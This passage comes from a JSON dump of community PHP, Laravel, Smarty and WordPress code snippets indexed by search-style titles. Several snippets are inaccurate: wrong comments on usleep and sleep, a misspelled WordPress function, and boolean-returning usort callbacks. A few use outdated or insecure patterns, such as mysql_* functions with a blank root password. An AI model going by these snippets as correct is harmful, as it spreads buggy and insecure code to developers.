    "description": "$now = DateTime::createFromFormat('U.u', microtime(true)); echo $now->format(\"m-d-Y H:i:s.u\");\n$d = new DateTime(); echo $d->format(\"Y-m-d H:i:s.v\"); // v : Milliseconds \n",
    "reg_date": "2021-10-12T10:20:20.000Z"
  },
  {
    "id": 4744,
    "keyword": null,
    "link": null,
    "title": " show display error php",
    "description": "// Add these lines somewhere on top of your PHP file: ini_set('display_errors', 1); ini_set('display_startup_errors', 1); error_reporting(E_ALL);\n//PHP functions - add the lines in the above of page  ini_set('display_errors', 1); ini_set('display_startup_errors', 0); error_reporting(E_ALL & ~E_NOTICE);\nerror_reporting(E_ALL); ini_set('display_errors', '1'); \n",
    "reg_date": "2021-10-12T10:20:20.000Z"
  },
  {
    "id": 4745,
    "keyword": null,
    "link": null,
    "title": " show featured image in post wordpress",
    "description": "if ( has_post_thumbnail()) {    $large_image_url = wp_get_attachment_image_src( get_post_thumbnail_id(), 'large');    echo '<a href=\"' . $large_image_url[0] . '\">';    the_post_thumbnail('thumbnail');    echo '</a>'; } \n<?php if (has_post_thumbnail( $post->ID ) ): ?>   <?php $image = wp_get_attachment_image_src( get_post_thumbnail_id( $post->ID ), 'single-post-thumbnail' ); ?>   <div id=\"custom-bg\" style=\"background-image: url('<?php echo $image[0]; ?>')\">    </div> <?php endif; ?>\n<?php  /* RETURNS a full image resource as: <img class=\"data...\" src=\"data...\">    ALL parameters are optional. Not needed if you are on WP LOOP */ echo get_the_post_thumbnail( $the_query->ID, array( 500, 400) );  /* USE get_the_post_thumbnail_url() to get only the image url */ ?>\n<?php echo the_post_thumbnail(); ?>\n<?php if(has_post_thumbnail()){   the_post_thumnbail('cstm_name', array( 'class' => 'class1 class2' )) } else { ?>   <img class=\"card-img-top\" src=\"http://placehold.it/750x300\" alt=\"Card image cap\" class=\"img-responsive\"> <?php } ?>\n",
    "reg_date": "2021-10-12T10:20:20.000Z"
  },
  {
    "id": 4746,
    "keyword": null,
    "link": null,
    "title": " show float laravel blade",
    "description": "<td>{{ number_format($variable_name->price, 2) }}</td>\n",
    "reg_date": "2021-10-12T10:20:20.000Z"
  },
  {
    "id": 4747,
    "keyword": null,
    "link": null,
    "title": " show html as text in php",
    "description": "htmlspecialchars('<strong>something</strong>') \n",
    "reg_date": "2021-10-12T10:20:20.000Z"
  },
  {
    "id": 4748,
    "keyword": null,
    "link": null,
    "title": " show php configuration",
    "description": "phpinfo();\n",
    "reg_date": "2021-10-12T10:20:20.000Z"
  },
  {
    "id": 4749,
    "keyword": null,
    "link": null,
    "title": " show php errors",
    "description": "// Add these lines somewhere on top of your PHP file: ini_set('display_errors', 1); ini_set('display_startup_errors', 1); error_reporting(E_ALL);\nini_set('display_errors', 1); ini_set('display_startup_errors', 1); error_reporting(E_ALL); \n/* Display all errors like dev */ ini_set('display_errors', 1); ini_set('display_startup_errors', 1); error_reporting(E_ALL);  /* Display PROD errors */ ini_set('display_errors', 1); ini_set('display_startup_errors', 0); error_reporting(E_ALL & ~E_NOTICE);  /* OTHER SETTINGS*/  // Report simple running errors error_reporting(E_ERROR | E_WARNING | E_PARSE);  // Reporting E_NOTICE  error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);  // Report all errors except E_NOTICE error_reporting(E_ALL & ~E_NOTICE); // For PHP < 5.3 error_reporting(E_ALL ^ E_NOTICE);  // Report all PHP errors error_reporting(E_ALL); //or error_reporting(-1); //or error_reporting(0);\n/* Answer to: \"php error reporting\" */  ini_set('display_errors', 1); ini_set('display_startup_errors', 1); error_reporting(E_ALL);  /*   What do these lines of code do exactly?    The ini_set function will try to override the configuration found   in your PHP ini file.    The display_errors and display_startup_errors are just two of the   directives that are available. The display_errors directive will   determine if the errors will be displayed or hidden to the user.   Usually, the dispay_errors directive should be turned off after   development.    The display_startup_errors, however, is a separate directive   because the display_errors doesn&rsquo;t handle the errors that will be   encountered during PHP&rsquo;s startup sequence. The list of the   directives that can be overridden by the ini_set function is found   in the official documentation. */\n//PHP functions ini_set('display_errors', 1); ini_set('display_startup_errors', 1); error_reporting(E_ALL);  //.htaccess php_flag display_startup_errors on php_flag display_errors on php_flag html_errors on php_flag log_errors on php_value error_log  /home/path/public_html/domain/PHP_errors.log\nerror_reporting(E_ALL); ini_set('display_errors', 1);\n",
    "reg_date": "2021-10-12T10:20:20.000Z"
  },
  {
    "id": 4750,
    "keyword": null,
    "link": null,
    "title": " show php info",
    "description": "phpinfo();\n// Show all information, defaults to INFO_ALL phpinfo();\nphpinfo(INFO_MODULES);\n",
    "reg_date": "2021-10-12T10:20:20.000Z"
  },
  {
    "id": 4751,
    "keyword": null,
    "link": null,
    "title": " show php modules installed",
    "description": "php -m\nphp -m | grep mbstring\n",
    "reg_date": "2021-10-12T10:20:20.000Z"
  },
  {
    "id": 4752,
    "keyword": null,
    "link": null,
    "title": " show query in laravel",
    "description": "Use the toSql() method on a QueryBuilder instance.  DB::table('users')->toSql()\n",
    "reg_date": "2021-10-12T10:20:21.000Z"
  },
  {
    "id": 4753,
    "keyword": null,
    "link": null,
    "title": " show selected value in dropdown laravel",
    "description": "<select class=\"js-states browser-default select2\" name=\"shopping_id\" required id=\"shopping_id\">         <option value=\"option_select\" disabled selected>Shoppings</option>         @foreach($shoppings as $shopping)             <option value=\"{{ $shopping->id }}\" {{$company->shopping_id == $shopping->id  ? 'selected' : ''}}>{{ $shopping->fantasyname}}</option>         @endforeach     </select> \n",
    "reg_date": "2021-10-12T10:20:21.000Z"
  },
  {
    "id": 4754,
    "keyword": null,
    "link": null,
    "title": " show user only those product which he hasn't buyed laravel eloquest",
    "description": "$user_id = auth()->user()->id;  Product::where('status', 'active')   ->whereNotIn('id', function($query) use ($user_id) {     $query->select('product_id')->from(new OrderProduct->getTable())       ->where('user_id', $user_id)->where('status', 'delivered') \t\t->pluck('product_id')->toArray();   });\n$user_id = auth()->user()->id;  Product::where('status', 'active')   ->whereNotIn('id', function($query) use ($user_id) {     $query->select('product_id')->from((new OrderProduct)->getTable())       ->where('user_id', $user_id)->where('status', 'delivered') \t\t->pluck('product_id')->toArray();   });\n",
    "reg_date": "2021-10-12T10:20:21.000Z"
  },
  {
    "id": 4755,
    "keyword": null,
    "link": null,
    "title": " show xml parse error in php",
    "description": "<?php libxml_use_internal_errors(true); $myXMLData = \"<?xml version='1.0' encoding='UTF-8'?> <document>   <user>John Doe</wronguser>   <email>john@example.com</wrongemail> </document>\";  $xml = simplexml_load_string($myXMLData); if ($xml === false) {     echo \"Failed loading XML: \";     foreach(libxml_get_errors() as $error) {         echo \"<br>\", $error->message;     } } else {     print_r($xml); } ?>\n",
    "reg_date": "2021-10-12T10:20:21.000Z"
  },
  {
    "id": 4756,
    "keyword": null,
    "link": null,
    "title": " showing blank page when i go to some route laravel",
    "description": "/*  The reason behind getting a blank pages is       because Route::resource will create some route with wildcards.      For e.g. clinic/{clinic} which will map to show method on      controller.     So when you make a get request to clinic/register it     will be mapped to this show method instead of your register method.  One possibility for not getting any errors is your show  method does not have any code yet. Hence, a blank response.  To summarize: Order in which you register your routes matters   */\n",
    "reg_date": "2021-10-12T10:20:21.000Z"
  },
  {
    "id": 4757,
    "keyword": null,
    "link": null,
    "title": " showing database table in php",
    "description": "$connection = mysql_connect('localhost', 'root', ''); //The Blank string is the password mysql_select_db('hrmwaitrose');  $query = \"SELECT * FROM employee\"; //You don't need a ; like you do in SQL $result = mysql_query($query);  echo \"<table>\"; // start a table tag in the HTML  while($row = mysql_fetch_array($result)){   //Creates a loop to loop through results echo \"<tr><td>\" . $row['name'] . \"</td><td>\" . $row['age'] . \"</td></tr>\";  //$row['index'] the index here is a field name }  echo \"</table>\"; //Close the table in HTML  mysql_close(); //Make sure to close out the database connection\n",
    "reg_date": "2021-10-12T10:20:21.000Z"
  },
  {
    "id": 4758,
    "keyword": null,
    "link": null,
    "title": " shuffle php function",
    "description": "<?php $i_arr = [\"html\", \"css\", \"javascript\", \"php\", \"vue\", \"react\"];  echo \"<pre>\"; print_r($i_arr); echo \"</pre>\";  shuffle($i_arr);  echo \"<pre>\"; print_r($i_arr); echo \"</pre>\"; ?>\nshuffle($myAry); \nstr_shuffle(\"You are beautiful\");\n",
    "reg_date": "2021-10-12T10:20:21.000Z"
  },
  {
    "id": 4759,
    "keyword": null,
    "link": null,
    "title": " signup API in laravel",
    "description": "//get Authorization Bearer Token value $token = $request->bearerToken();\n/**  * API Register  *  * @param Request $request  * @return \\Illuminate\\Http\\JsonResponse  */ public function register(Request $request) {     $rules = [         'name' => 'unique:users|required',         'email'    => 'unique:users|required',         'password' => 'required',     ];      $input     = $request->only('name', 'email','password');     $validator = Validator::make($input, $rules);      if ($validator->fails()) {         return response()->json(['success' => false, 'error' => $validator->messages()]);     }     $name = $request->name;     $email    = $request->email;     $password = $request->password;     $user     = User::create(['name' => $name, 'email' => $email, 'password' => Hash::make($password)]);  } \n<?php  namespace App\\Http\\Controllers;   use Illuminate\\Http\\Request; use App\\User;  class AuthController extends Controller {     public $loginAfterSignUp = true;      public function register(Request $request)     {       $user = User::create([         'name' => $request->name,         'email' => $request->email,         'password' => bcrypt($request->password),       ]);        $token = auth()->login($user);        return $this->respondWithToken($token);     }      public function login(Request $request)     {       $credentials = $request->only(['email', 'password']);        if (!$token = auth()->attempt($credentials)) {         return response()->json(['error' => 'Unauthorized'], 401);       }        return $this->respondWithToken($token);     }     public function getAuthUser(Request $request)     {         return response()->json(auth()->user());     }     public function logout()     {         auth()->logout();         return response()->json(['message'=>'Successfully logged out']);     }     protected function respondWithToken($token)     {       return response()->json([         'access_token' => $token,         'token_type' => 'bearer',         'expires_in' => auth()->factory()->getTTL() * 60       ]);     }  }  \n",
    "reg_date": "2021-10-12T10:20:21.000Z"
  },
  {
    "id": 4760,
    "keyword": null,
    "link": null,
    "title": " simple form for id",
    "description": "simple_form_for @account, html: { id: :edit_account } do |f|\n",
    "reg_date": "2021-10-12T10:20:21.000Z"
  },
  {
    "id": 4761,
    "keyword": null,
    "link": null,
    "title": " simple localhost php",
    "description": "1) cd ~/public_html 2) php -S localhost:8000\n1) Edit C:\\wamp\\sendmail\\sendmail.ini:  smtp_server=smtp.gmail.com smtp_port=465 auth_username=user@gmail.com auth_password=your_password 2) Edit php.ini and set sendmail_path  sendmail_path = \"C:\\wamp\\sendmail\\sendmail.exe -t\" \n",
    "reg_date": "2021-10-12T10:20:22.000Z"
  },
  {
    "id": 4762,
    "keyword": null,
    "link": null,
    "title": " single or cakephp",
    "description": "// ------------------------------------ // ------------ one OR -------------- // ------------------------------------ $conditions = array(     'OR' => array(         array( 'MemberRole.school_id' \t=> array()),         array( 'MemberRole.role_id' \t=> $role),     ); );  // ------------------------------------ // ------------ multiple OR -------------- // ------------------------------------  'OR' => array(    array(      'MemberRole.school_id' \t=> array(),      'MemberRole.role_id' \t=> $role,    ),    array(      'MemberRole.school_id' \t=> array(),      'MemberRole.role_id' \t=>  Environment::read('role.register'),    ),    array(      'MemberRole.school_id' \t=> $school_id,      'MemberRole.role_id' \t=> Environment::read('role.register'),    ),    array(      'MemberRole.school_id' \t=> $school_id,      'MemberRole.role_id' \t=> $role    )  )\n",
    "reg_date": "2021-10-12T10:20:22.000Z"
  },
  {
    "id": 4763,
    "keyword": null,
    "link": null,
    "title": " singleton in php",
    "description": "// General singleton class. class Singleton {   // Hold the class instance.   private static $instance = null;      // The constructor is private   // to prevent initiation with outer code.   private function __construct()   {     // The expensive process (e.g.,db connection) goes here.   }     // The object is created from within the class itself   // only if the class has no instance.   public static function getInstance()   {     if (self::$instance == null)     {       self::$instance = new Singleton();     }       return self::$instance;   } }  \n",
    "reg_date": "2021-10-12T10:20:22.000Z"
  },
  {
    "id": 4764,
    "keyword": null,
    "link": null,
    "title": " sleep function in php",
    "description": "<?php echo date('h:i:s').'<br>'; //hour:minute:second sleep(10); //10 seconds echo date('h:i:s'); ?>\nsleep(1.5);\t// Sleeps 1.5 seconds\n<?php     sleep(4);     echo \"Done\\n\"; ?> \nsleep()\n<?php     sleep(4);     echo \"Done\\n\"; ?>\n",
    "reg_date": "2021-10-12T10:20:22.000Z"
  },
  {
    "id": 4765,
    "keyword": null,
    "link": null,
    "title": " sleep microseconds php",
    "description": "usleep(10);\t// Sleeps 1 millisecond\n <?php  // Current time echo date('h:i:s') . \"\\n\";  // wait for 2 seconds usleep(2000000);  // back! echo date('h:i:s') . \"\\n\";  ?>  \n",
    "reg_date": "2021-10-12T10:20:22.000Z"
  },
  {
    "id": 4766,
    "keyword": null,
    "link": null,
    "title": " sleep php",
    "description": "<?php echo date('h:i:s').'<br>'; //hour:minute:second sleep(10); //10 seconds echo date('h:i:s'); ?>\nsleep(1.5);\t// Sleeps 1.5 seconds\n<?php     sleep(4);     echo \"Done\\n\"; ?> \nsleep()\n<?php     sleep(4);     echo \"Done\\n\"; ?>\n",
    "reg_date": "2021-10-12T10:20:22.000Z"
  },
  {
    "id": 4767,
    "keyword": null,
    "link": null,
    "title": " smarty foreach",
    "description": "{foreach from=$myArray item=foo}     <li>{$foo}</li> {/foreach}  OR  {foreach $aZoneRecord as $aZoneRecordKey => $aZoneRecordVal}{/foreach}\n{*Array of items*} {foreach from=$myArray item=foo}     <li>{$foo}</li> {/foreach}  {*Key value array*} {foreach from=$myArray key=k item=v}    <li>{$k}: {$v}</li> {/foreach}\n",
    "reg_date": "2021-10-12T10:20:22.000Z"
  },
  {
    "id": 4768,
    "keyword": null,
    "link": null,
    "title": " smarty if",
    "description": "{if isset($name) && $name == 'Blog'}      {* do something *} {elseif $name == $foo}     {* do something *} {/if}  {if is_array($foo) && count($foo) > 0}     {* do a foreach loop *} {/if}\n{if $userroleid eq 12 || $userroleid eq 13 || $userroleid eq 14 }     <a href=\"{$v.feature_url}\" class=\"re-upload\"> View</a> {else}     <a href=\"{$v.feature_url}\" class=\"re-upload\"> Re-upload</a> {/if} \n",
    "reg_date": "2021-10-12T10:20:22.000Z"
  },
  {
    "id": 4769,
    "keyword": null,
    "link": null,
    "title": " smarty php",
    "description": "{* this template includes a {php} block that assign's the variable $varX *} {php}    global $foo, $bar;    if($foo == $bar){      echo 'This will be sent to browser';    }   // assign a variable to Smarty   $this->assign('varX','Toffee'); {/php} {* output the variable *} <strong>{$varX}</strong> is my fav ice cream :-) \n {php}    // including a php script directly from the template.    include('/path/to/display_weather.php'); {/php}    \n",
    "reg_date": "2021-10-12T10:20:22.000Z"
  },
  {
    "id": 4770,
    "keyword": null,
    "link": null,
    "title": " smarty prestashop get language",
    "description": "{$language.iso_code}\n",
    "reg_date": "2021-10-12T10:20:22.000Z"
  },
  {
    "id": 4771,
    "keyword": null,
    "link": null,
    "title": " smarty shorthand assign var",
    "description": "{assign \"access\" value=false} or {assign var=\"access\" value=false} or {$access=false}\n",
    "reg_date": "2021-10-12T10:20:23.000Z"
  },
  {
    "id": 4772,
    "keyword": null,
    "link": null,
    "title": " smtp php test",
    "description": "<?php      ini_set( 'display_errors', 1 );     error_reporting( E_ALL );     $from = \"emailtest@YOURDOMAIN\";     $to = \"YOUREMAILADDRESS\";     $subject = \"PHP Mail Test script\";     $message = \"This is a test to check the PHP Mail functionality\";     $headers = \"From:\" . $from;     mail($to,$subject,$message, $headers);     echo \"Test email sent\"; ?>\n",
    "reg_date": "2021-10-12T10:20:23.000Z"
  },
  {
    "id": 4773,
    "keyword": null,
    "link": null,
    "title": " smtp server xampp",
    "description": "//in php.ini file find [mail function] and change  SMTP=smtp.gmail.com smtp_port=587 sendmail_from = my-gmail-id@gmail.com sendmail_path = \"\\\"C:\\xampp\\sendmail\\sendmail.exe\\\" -t\"\n//Now Open C:\\xampp\\sendmail\\sendmail.ini.  //Replace all the existing code in sendmail.ini with following code  [sendmail]  smtp_server=smtp.gmail.com smtp_port=587 error_logfile=error.log debug_logfile=debug.log auth_username=my-gmail-id@gmail.com auth_password=my-gmail-password\n",
    "reg_date": "2021-10-12T10:20:23.000Z"
  },
  {
    "id": 4774,
    "keyword": null,
    "link": null,
    "title": " soft delete",
    "description": "<?php  namespace App\\Models;  use Illuminate\\Database\\Eloquent\\Model; use Illuminate\\Database\\Eloquent\\SoftDeletes;  class Flight extends Model {     use SoftDeletes; }\n",
    "reg_date": "2021-10-12T10:20:23.000Z"
  },
  {
    "id": 4775,
    "keyword": null,
    "link": null,
    "title": " softdeletes laravel",
    "description": "class Clientes extends Model{    use SoftDeletes;    protected $dates = ['deleted_at'];}\n/** in migrations this changes need to     add for table we want to add soft delete (LARAVEL)*/  \t/** The migrations. START */ \tpublic function up() \t{ \t\tSchema::table('users', function(Blueprint $table) \t\t{ \t\t\t$table->softDeletes(); \t\t}); \t} \t/** The migrations. END */  \t/** after adding softdelete you need to     point that column in table related model (LARAVEL)*/  \t/** The Model. START */   \tuse Illuminate\\Database\\Eloquent\\SoftDeletes;   \tclass User extends Model { \t  use SoftDeletes; \t  protected $dates = ['deleted_at']; \t} \t/** The Model. END */\nSchema::table('flights', function (Blueprint $table) {     $table->softDeletes(); });\n$flights = Flight::where('active', 1)                ->orderBy('name')                ->take(10)                ->get();\n",
    "reg_date": "2021-10-12T10:20:23.000Z"
  },
  {
    "id": 4776,
    "keyword": null,
    "link": null,
    "title": " sort array by key value in php",
    "description": "$inventory = array(     array(\"type\"=>\"fruit\", \"price\"=>3.50),    array(\"type\"=>\"milk\", \"price\"=>2.90),    array(\"type\"=>\"pork\", \"price\"=>5.43),  ); $price = array_column($inventory, 'price'); array_multisort($price, SORT_DESC, $inventory);\n  $weight = [     'Pete' => 75,      'Benjamin' => 89,     'Jonathan' => 101   ];  \t   ksort($weight);\n usort($array, function ($a, $b) {   return ($a['specific_key'] < $b['specific_key']) ? -1 : 1; }); \n$inventory = [ \t['price' => 10.99, 'product' => 'foo 1'],     ['price' => 5.99, 'product' => 'foo 2'],   \t['price' => 100, 'product' => 'foo 3'],    ];  $price = array_column($inventory, 'price');  array_multisort($price, SORT_DESC, $inventory);\nTo PHP sort array by key, you should use:  \tksort() (for ascending order) or krsort() (for descending order).         To PHP sort array by value, you will need functions: \tasort() and arsort() (for ascending and descending orders).\n    function cmp($a, $b)     {         return strcmp($a->display_name, $b->display_name);     }      usort($blogusers, \"cmp\");      foreach ($blogusers as $bloguser)     {         ...\n",
    "reg_date": "2021-10-12T10:20:23.000Z"
  },
  {
    "id": 4777,
    "keyword": null,
    "link": null,
    "title": " sort array php",
    "description": "<?php $fruit = array(\"apple\",\"banana\",\"mango\",\"orange\",\"strawbary\");  sort($fruit);       //arrange in ascending order echo \"<pre>\"; print_r($fruit);  rsort( $fruit);     //sort in descending order foreach($fruit as $val) {     echo $val.\"<br>\"; }  $girl = array(\"krisha\"=>20,\"yashvi\"=>30,\"ritu\"=>4,\"pinal\"=>80); asort($girl);       //sort in ascending order according to value print_r($girl);  ksort($girl);   //sort in ascending order according to key print_r($girl);       arsort($girl);      //sort in descending order according to value print_r($girl);  krsort($girl);      //sort in descending order according to key print_r($girl); ?>\n//php 7+ usort($inventory, function ($item1, $item2) {     return $item1['price'] <=> $item2['price']; });\n$price = array(); foreach ($inventory as $key => $row) {     $price[$key] = $row['price']; } array_multisort($price, SORT_DESC, $inventory);\n<?php $fruits = array(\"d\" => \"lemon\", \"a\" => \"orange\", \"b\" => \"banana\", \"c\" => \"apple\"); asort($fruits); foreach ($fruits as $key => $val) {     echo \"$key = $val\\n\"; } ?> //Would output: c = apple b = banana d = lemon a = orange  \nfunction aasort (&$array, $key) {     $sorter=array();     $ret=array();     reset($array);     foreach ($array as $ii => $va) {         $sorter[$ii]=$va[$key];     }     asort($sorter);     foreach ($sorter as $ii => $va) {         $ret[$ii]=$array[$ii];     }     $array=$ret; }  aasort($your_array,\"order\"); \n <?php  $fruits = array(\"Zitrone\", \"Orange\", \"Banane\", \"Apfel\"); sort($fruits); foreach ($fruits as $key => $val) {     echo \"fruits[\" . $key . \"] = \" . $val . \"\\n\"; }  ?>  \n",
    "reg_date": "2021-10-12T10:20:23.000Z"
  },
  {
    "id": 4778,
    "keyword": null,
    "link": null,
    "title": " sort json in php",
    "description": "<?php                                                                                                                                                                                                        usort($data, function($a, $b) { //Sort the array using a user defined function     return $a->score > $b->score ? -1 : 1; //Compare the scores });                                                                                                                                                                                                          print_r($data);    ?>\n",
    "reg_date": "2021-10-12T10:20:24.000Z"
  },
  {
    "id": 4779,
    "keyword": null,
    "link": null,
    "title": " sort laravel eloquent",
    "description": "$users = DB::table('users')          -> orderBy('name', 'desc')          -> get();\n$collection = collect([5, 3, 1, 2, 4]);  $sorted = $collection->sortDesc();  $sorted->values()->all();  // [5, 4, 3, 2, 1]\n$posts = Post::orderBy('id', 'DESC')->get(); \n$results = Project::orderBy('name')->get();\n",
    "reg_date": "2021-10-12T10:20:24.000Z"
  },
  {
    "id": 4780,
    "keyword": null,
    "link": null,
    "title": " sort multi array php",
    "description": "function sortByAge($a, $b) {      return $a['age'] > $b['age'];  }  $people=[      [\"age\"=>54,\"first_name\"=>\"Bob\",\"last_name\"=>\"Dillion\"],      [\"age\"=>22,\"first_name\"=>\"Sarah\",\"last_name\"=>\"Harvard\"],      [\"age\"=>31,\"first_name\"=>\"Chuck\",\"last_name\"=>\"Bartowski\"]  ];    usort($people, 'sortByAge'); //$people is now sorted by age (ascending)\narray_multisort(array_map(function($element) {       return $element['order'];   }, $array), SORT_ASC, $array);  print_r($array);\n\t\t$keys = array_column($array, 'Price');  \t\tarray_multisort($keys, SORT_ASC, $array); \t \t\tprint_r($array);\nfunction sortByOrder($a, $b) {     return $a['order'] - $b['order']; }  usort($myArray, 'sortByOrder');\n",
    "reg_date": "2021-10-12T10:20:24.000Z"
  },
  {
    "id": 4781,
    "keyword": null,
    "link": null,
    "title": " sort multidimensional array in php",
    "description": "function sortByAge($a, $b) {      return $a['age'] > $b['age'];  }  $people=[      [\"age\"=>54,\"first_name\"=>\"Bob\",\"last_name\"=>\"Dillion\"],      [\"age\"=>22,\"first_name\"=>\"Sarah\",\"last_name\"=>\"Harvard\"],      [\"age\"=>31,\"first_name\"=>\"Chuck\",\"last_name\"=>\"Bartowski\"]  ];    usort($people, 'sortByAge'); //$people is now sorted by age (ascending)\narray_multisort(array_map(function($element) {       return $element['order'];   }, $array), SORT_ASC, $array);  print_r($array);\n\t\t$keys = array_column($array, 'Price');  \t\tarray_multisort($keys, SORT_ASC, $array); \t \t\tprint_r($array);\n<?php function sortByPrice($a, $b){ \treturn $a['price'] > $b['price']; }  $items = [     ['label' => 'cake', 'name' => 'Cake', 'price' => 150],     ['label' => 'pizza', 'name' => 'Pizza', 'price' => 250],     ['label' => 'puff', 'name' => 'Veg Puff', 'price' => 20],     ['label' => 'samosa', 'name' => 'Samosa', 'price' => 14] ];  //Sort by Price usort($items, 'sortByPrice'); //print_r($items);  print \"<br/> After Sort by Price printing: <br/>\"; foreach($items as $item){ \tprint $item['name'].\" \".$item['price'].\"<br/>\"; } $newArray = array_column($items, 'price', 'name');  // find max, min, and toal sum of array $totalExp = array_sum(array_column($items, 'price', 'name')); $maxPrice  = max(array_column($items, 'price', 'name')); $minPrice  = min(array_column($items, 'price', 'name'));  print \"Total Expenses : \".$totalExp.\"<br/>\"; print \"What is Costly Item : \".$maxPrice.' ('.array_search($maxPrice, $newArray).\")<br/>\"; print \"What is Cheap Item : \".$minPrice.' ('.array_search($minPrice, $newArray).\")<br/>\";  ?>\n",
    "reg_date": "2021-10-12T10:20:24.000Z"
  },
  {
    "id": 4782,
    "keyword": null,
    "link": null,
    "title": " sortbydesc on a collection laravel",
    "description": "$response = $f_games->merge($s_games)->sortByDesc('id')->values(); \n$collection = collect([5, 3, 1, 2, 4]);  $sorted = $collection->sort();  $sorted->values()->all();  // [1, 2, 3, 4, 5]\n",
    "reg_date": "2021-10-12T10:20:24.000Z"
  },
  {
    "id": 4783,
    "keyword": null,
    "link": null,
    "title": " spatie media library retrieve media from url",
    "description": "//To retrieve files you can use the getMedia-method: $mediaItems = $yourModel->getMedia(); //The method returns a collection of Media-objects.   //You can retrieve the url and path to the file associated with the Media-object using getUrl, getTemporaryUrl (for S3 only) and getPath: $publicUrl = $mediaItems[0]->getUrl(); $publicFullUrl = $mediaItems[0]->getFullUrl(); //url including domain $fullPathOnDisk = $mediaItems[0]->getPath(); $temporaryS3Url = $mediaItems[0]->getTemporaryUrl(Carbon::now()->addMinutes(5));\n",
    "reg_date": "2021-10-12T10:20:24.000Z"
  },
  {
    "id": 4784,
    "keyword": null,
    "link": null,
    "title": " specified key was too long; max key length is 767 bytes (s",
    "description": "use Illuminate\\Support\\Facades\\Schema;  public function boot() {     Schema::defaultStringLength(191); } \n",
    "reg_date": "2021-10-12T10:20:24.000Z"
  },
  {
    "id": 4785,
    "keyword": null,
    "link": null,
    "title": " specified key was too long max key length is 767 bytes",
    "description": "use Illuminate\\Support\\Facades\\Schema;  public function boot() {     Schema::defaultStringLength(191); } \n# AppServiceProvider.php  use Illuminate\\Support\\Facades\\Schema;  public function boot() {     Schema::defaultStringLength(191); } \nIn app\\Providers\\AppServiceProvider.php File  // Add  use Illuminate\\Support\\Facades\\Schema;  public function boot() { \t// Add In boot function \t \tSchema::defaultStringLength(191); } \n",
    "reg_date": "2021-10-12T10:20:24.000Z"
  },
  {
    "id": 4786,
    "keyword": null,
    "link": null,
    "title": " split array with comma php",
    "description": "// ------------------------------------------------ // php implode / explode  \"expiry\": [   \"94 Paracoins will expiry date 2020-10-28\",   \"20 Paracoins will expiry date 2020-12-15\",   \"2 Paracoins will expiry date 2020-12-20\",   \"2 Paracoins will expiry date 2021-01-22\",   \"8 Paracoins will expiry date 2021-01-28\" ]  $expiry = implode(\", \", $expiry);  //=> $expiry_message  => $expiry = \"94 Paracoins will expiry date 2020-10-28, 20 Paracoins will expiry date 2020-12-15, 2 Paracoins will expiry date 2020-12-20, 2 Paracoins will expiry date 2021-01-22, 8 Paracoins will expiry date 2021-01-28\"\n",
    "reg_date": "2021-10-12T10:20:24.000Z"
  },
  {
    "id": 4787,
    "keyword": null,
    "link": null,
    "title": " split php",
    "description": "$myString = \"9,admin@example.com,8\"; $myArray = explode(',', $myString); print_r($myArray);\n// Example 1 $pizza  = \"piece1 piece2 piece3 piece4 piece5 piece6\"; $pieces = explode(\" \", $pizza); echo $pieces[0]; // piece1 echo $pieces[1]; // piece2\n<?php // It doesnt get any better than this Example $pizza  = \"piece1 piece2 piece3 piece4 piece5 piece6\"; $pieces = explode(\" \", $pizza); echo $pieces[0]; // piece1 echo $pieces[1]; // piece2\n// split() function was DEPRECATED in PHP 5.3.0, and REMOVED in PHP 7.0.0. // ALTERNATIVES: explode(), preg_split()  // explode() // DESCRIPTION: Breaks a string into an array. // explode ( string $separator , string $string , int $limit = PHP_INT_MAX ) : array $pizza  = \"piece1 piece2 piece3 piece4 piece5 piece6\"; $pieces = explode(\" \", $pizza); echo $pieces[0]; // piece1 echo $pieces[1]; // piece2  // preg_split() // DESCRIPTION: Split the given string by a regular expression. // preg_split ( string $pattern , string $subject , int $limit = -1 , int $flags = 0 ) : array|false $keywords = preg_split(\"/[\\s,]+/\", \"hypertext language, programming\"); print_r($keywords); // output: Array (     [0] => hypertext     [1] => language     [2] => programming )\nexplode(\" \",\"Geeks for Geeks\")\nYou can use this following function      function str_rsplit($string, $length) {     // splits a string \"starting\" at the end, so any left over (small chunk) is at the beginning of the array.     if ( !$length ) { return false; }     if ( $length > 0 ) { return str_split($string,$length); }    // normal split      $l = strlen($string);     $length = min(-$length,$l);     $mod = $l % $length;      if ( !$mod ) { return str_split($string,$length); }    // even/max-length split      // split     return array_merge(array(substr($string,0,$mod)), str_split(substr($string,$mod),$length)); }   $str = '123456789'; str_split($str,5); // return: {\"12345\",\"6789\"} str_rsplit($str,5);  // return: {\"12345\",\"6789\"} str_rsplit($str,-7); // return: {\"12\",\"3456789\"} \n",
    "reg_date": "2021-10-12T10:20:24.000Z"
  },
  {
    "id": 4788,
    "keyword": null,
    "link": null,
    "title": " sql repare php",
    "description": "$servername = \"localhost\"; $username = \"username\"; $password = \"password\"; $dbname = \"myDB\";  $conn = new mysqli($servername, $username, $password, $dbname);  if ($conn->connect_error) {   die(\"Connection failed: \" . $conn->connect_error); }  $stmt = $conn->prepare(\"INSERT INTO MyGuests (firstname, lastname, email) VALUES (?, ?, ?)\"); $stmt->bind_param(\"sss\", $firstname, $lastname, $email);  $firstname = \"John\"; $lastname = \"Doe\"; $email = \"john@example.com\"; $stmt->execute();  echo \"New records created successfully\";  $stmt->close(); $conn->close();\n$array_of_values = array( \"Brasil\", \"Argentina\" ); $types = \"ss\"; $mysqli_stmt->bind_param( $types, ...$array_of_values ); \n",
    "reg_date": "2021-10-12T10:20:25.000Z"
  },
  {
    "id": 4789,
    "keyword": null,
    "link": null,
    "title": " sql row count php pdo",
    "description": " <?php /* Delete all rows from the FRUIT table */ $del = $dbh->prepare('DELETE FROM fruit'); $del->execute();  /* Return number of rows that were deleted */ print(\"Return number of rows that were deleted:\\n\"); $count = $del->rowCount(); print(\"Deleted $count rows.\\n\"); ?>  \n//Instantiate the PDO object and connect to MySQL. $pdo = new PDO(     'mysql:host=127.0.0.1;dbname=my_database',     'username',     'password' );   //The COUNT SQL statement that we will use. $sql = \"SELECT COUNT(*) AS num FROM users\";   //Prepare the COUNT SQL statement. $stmt = $pdo->prepare($sql);   //Execute the COUNT statement. $stmt->execute();   //Fetch the row that MySQL returned. $row = $stmt->fetch(PDO::FETCH_ASSOC);   //The $row array will contain \"num\". Print it out. echo $row['num'] . ' users exist.'; \n",
    "reg_date": "2021-10-12T10:20:25.000Z"
  },
  {
    "id": 4790,
    "keyword": null,
    "link": null,
    "title": " start laravel queue",
